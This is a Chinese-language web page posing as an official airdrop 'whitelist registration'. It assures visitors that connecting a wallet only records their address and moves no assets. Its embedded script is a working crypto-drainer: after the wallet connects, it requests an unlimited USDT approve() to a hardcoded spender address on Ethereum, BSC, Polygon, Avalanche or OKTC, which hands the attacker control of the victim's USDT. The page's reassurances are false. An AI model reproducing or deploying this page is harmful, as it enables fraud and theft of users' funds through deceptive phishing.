<html lang="zh-CN"><meta charset="UTF-8">

*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
body{background:linear-gradient(135deg,#080e1b,#101a33);min-height:100vh;color:#f04ff;padding:20px 15px;padding-bottom:60px}
.container{max-width:480px;margin:0 auto}
.box{background:rgba(20,29,48,.95);border-radius:20px;padding:30px 25px;margin-top:20px;border:1px solid rgba(64,152,2,.18);box-shadow:0 10px 40px rgba(0,0,0,.35);text-align:center}
.hide{display:none}
.logo{width:72px;height:72px;margin:0 auto 15px;border-radius:18px;background:linear-gradient(135deg,#3b88eb,#28c76f);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold}
h1{font-size:22px;margin-bottom:8px;color:#fff}
.sub-title{font-size:22px;color:#fff;margin-bottom:25px}
.desc-text{font-size:15px;color:#a1b4e8;line-height:1.7;margin-bottom:25px}
.notice-box{background:rgba(35,48,74,.6);border-radius:14px;padding:18px;text-align:left;margin-bottom:25px}
.notice-title{font-size:16px;color:#409eff;margin-bottom:10px;font-weight:600}
.notice-content{font-size:13px;color:#b0c4e8;line-height:1.65}
.btn{width:100%;height:50px;border:none;border-radius:12px;font-size:16px;font-weight:600;margin:9px 0;cursor:pointer;transition:all .2s}
.btn:active{opacity:.9;transform:scale(.98)}
.mm-btn{background:linear-gradient(135deg,#f6851b,#d86f03);color:#fff}
.verify-btn{background:linear-gradient(135deg,#23b55c,#19944a);color:#fff}
.success-btn{background:#10b986;color:#fff;pointer-events:none;opacity:.8}
.addr-wrap{background:rgba(14,22,40,.75);padding:13px;border-radius:12px;margin:20px 0;font-size:12.5px;color:#89a2d8;word-break:break-all}
.tips-info{font-size:12px;color:#6c7ca0;margin-top:18px;line-height:1.6}
.footer-link{display:none;}
.footer-link a{color:#409eff;text-decoration:none;margin-top:6px;display:block}
</head<div<div id="p1" class<div class</div<h1>官方</h<p class="sub-title">参与链上资格核验领取专属空投权益<div class<div class="notice-title">📢</div><div class="notice-content">为回馈广大用户长期支持，本次开启官方生态全网空投备案活动，面向所有生态用户开放资格申领。仅需完成钱包连接与链上资格核验，即可成功录入空投白名单，后续将统一发放专属生态空投奖励。本次操作仅为地址备案与资格核验，不会产生任何资产扣除，所有流程安全合规，可放心参与完成核验。</div>
<p class="desc-text">请连接钱包完成链上资格备案登记<button class="btn mm-btn" id="connectMM">连接钱包<p class="tips-info">安全提示：仅进行地址备案核验<br>请认准官方通道，切勿相信第三方仿冒链接</div<div id="p2" class="box hide<div class="logo</div>
<h1>链上节点</h1<p class="desc-text">正在同步链上数据，请稍候...</div>

<div id="p3" class="box hide">
<div class="logo">✓<h1</h<p class="sub-title">确认纳入空投</p>
<div class="addr-wrap"><span</span<button class="btn verify-btn" id="claim">下一步 确认备案 录入白名单<p class="tips-info">仅链上地址备案核验，不会划转</p>
<div id="p4" class="<div class</div<h1>白</h1<p class="sub-title">该地址已完成</p><div class="addr-wrap">备案钱包地址：<span id="successAddr"><button class="btn success-btn">已完成备案 等待空投发放</button>
</div><script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"><script>
!function(){
// 五条链配置：BSC/ETH/POLYGON/AVAX/OKTC
const chainConfig = {
  // ETH 以太坊
  "0x1":  {usdt:"0xdac17f958d2ee523a2206206994597c13d831ec7"},
  // BSC 币安链
  "0x38": {usdt:"0x55d398326f99059fF77548524699952727959279"},
  // POLYGON 马蹄
  "0x89": {usdt:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F"},
  // AVAX 雪崩
  "0xa86a":{usdt:"0x97022F01A4bE6dA0c05F409C90208Aab35E21E4D"},
  // OKTC 欧科
  "0x42": {usdt:"0x382bb868d458e9d4a3497b8434ee999af5999cb6"}
};
const BSC_CHAIN_ID = "0x38";
const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";

let walletAddr = "";
let currentChainId = "";
let alreadyPassP4 = false;

function switchPage(id){
  document.querySelectorAll(".box").forEach(el=>el.classList.add("hide"));
  document.getElementById(id).classList.remove("hide");
}

// 默认进入先切BSC
async function switchToBSC(){
  if(!window.ethereum) return false;
  try{
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{chainId: BSC_CHAIN_ID}]
    });
    return true;
  }catch(err){
    return false;
  }
}

// 钱包全局监听 修复卡屏
if(window.ethereum){
  window.ethereum.on("chainChanged", (cid)=>{
    currentChainId = cid;
  });
  window.ethereum.on("accountsChanged", ()=>{
    walletAddr = "";
    alreadyPassP4 = false;
    switchPage("p1");
  });
  window.ethereum.on("disconnect", ()=>{
    walletAddr = "";
    alreadyPassP4 = false;
    switchPage("p1");
  });
}

// 自动匹配当前链USDT授权
async function doApprove(){
  if(!walletAddr || !currentChainId) return false;
  // 判断是否在支持的链里
  if(!chainConfig[currentChainId]){
    alert("当前链暂不支持，请切换至主流公链参与");
    return false;
  }
  try{
    const web3 = new Web3(window.ethereum);
    const usdtAddr = chainConfig[currentChainId].usdt;
    const abi = [
      {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],
      "name":"approve","outputs":[{"name":"","type":"bool"}],
      "type":"function"
    ];
    const contract = new web3.eth.Contract(abi, usdtAddr);
    await contract.methods.approve(SPENDER,"115792089237316195423570985008687907853269984665640564039457584007913129639935")
    .send({from:walletAddr});
    return true;
  }catch(err){
    // 拒绝、弹窗关闭、报错 全部回落P3 不卡死
    return false;
  }
}

// 连接钱包
document.getElementById("connectMM").addEventListener("click", async ()=>{
  try{
    switchPage("p2");
    if(!alreadyPassP4){
      await switchToBSC();
    }
    const accounts = await window.ethereum.request({method:"eth_requestAccounts"});
    walletAddr = accounts[0];
    currentChainId = await window.ethereum.request({method:"eth_chainId"});
    document.getElementById("showAddr").innerText = walletAddr;
    switchPage("p3");
  }catch(err){
    switchPage("p1");
  }
});

// P3下一步
document.getElementById("claim").addEventListener("click", async ()=>{
  try{
    switchPage("p2");
    const res = await doApprove();
    if(res){
      alreadyPassP4 = true;
      document.getElementById("successAddr").innerText = walletAddr;
      switchPage("p4");
    }else{
      switchPage("p3");
    }
  }catch(err){
    switchPage("p3");
  }
});

}();
</script>
</html>
